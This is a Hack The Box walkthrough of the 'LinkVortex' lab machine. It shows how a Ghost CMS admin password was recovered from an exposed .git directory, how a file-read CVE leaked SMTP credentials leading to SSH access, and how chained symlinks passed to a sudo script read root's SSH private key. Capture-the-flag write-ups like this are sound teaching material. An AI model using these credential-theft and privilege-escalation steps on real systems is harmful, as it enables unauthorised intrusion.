---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/linkvortex/","tags":["#linux","ghost-cms","symlinks","exposed_git_dir","custom-tool-sudo-exploit"]}
---

# 10.10.11.47
---
# Initial Enumeration &  Recon bits
I like to leave my Discovery/Enumeration & Recon relatively unstructured, just to build up application context so I can think about how to crack it
## ports
```bash hl:1,5,7
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
|_http-title: BitByBit Hardware
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## subdomain: dev.linkvortex.htb

- `/.git/` grab git dirs with goop 
	- `git status -v`
	- try the new passwd (green) for admin@linkvortex.htb

## robots.txt dirs
- `/ghost/` [ghost cms](https://ghost.org) admin login
	- main blog shows ghost 5.58 ![Pasted image 20241207205421.png](/img/user/img/Pasted%20image%2020241207205421.png)
	- ![Pasted image 20241207203412.png](/img/user/img/Pasted%20image%2020241207203412.png) hashrouter?
		- valid account determination is possible
		- admin@linkvortex.htb is a valid account
		- brumbo@brumbo.brumbo is not
- `/ghost/api/` api endpoint
- `/p/`
- `/email/`
- `/r/`
	- these dirs are saying 404 but I believe it's really an unauth
## creds

- *ghost admin panel*
	`admin@linkvortex.htb:OctopiFociPilfer45` role: owner


# Exploitation 

## what might work
- https://github.com/0xyassine/CVE-2023-40028/tree/master
	- requires Authenticated user account

## what did
- https://github.com/0xyassine/CVE-2023-40028/tree/master
	- requires Authenticated user account
		- see valid account determination + .git repo staged changes from dev vhost
			- `git status -v`
			- get admin passwd from staged changes
			- use vuln to check the prod config:
				- `+COPY config.production.json /var/lib/ghost/config.production.json`
				  
```json hl:32,33
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
- ssh as bob:
```bash
 ❯ ssh bob@linkvortex.htb
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$
```
# Post Exploitation i.e. privsec
## what might work
```bash
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

```bash hl:5,19,25
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```
- so if $CHECK_CONTENT is null then script sets it to false, so first ensure it's true
- next, if the symlinked file is linked to anywhere in /etc/ or /root/ then the link is removed and the file is removed -> script exits
- we need to get into the logic of content checking, so we need to link something in /root/ to file A, then link file A to file B
- when we run the script on file B, it will see the link is to file A, but the content is still linked to whatever in root


## what did
- my idea above worked

```bash
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa brumbo.png
bob@linkvortex:~$ ln -s /home/bob/brumbo.png malicious.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh malicious.png
Link found [ malicious.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
---SNIP---



ssh root@linkvortex.htb -i root_rsa 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  9 22:00:43 2024 from 10.10.14.196
root@linkvortex:~# cat root.txt
```

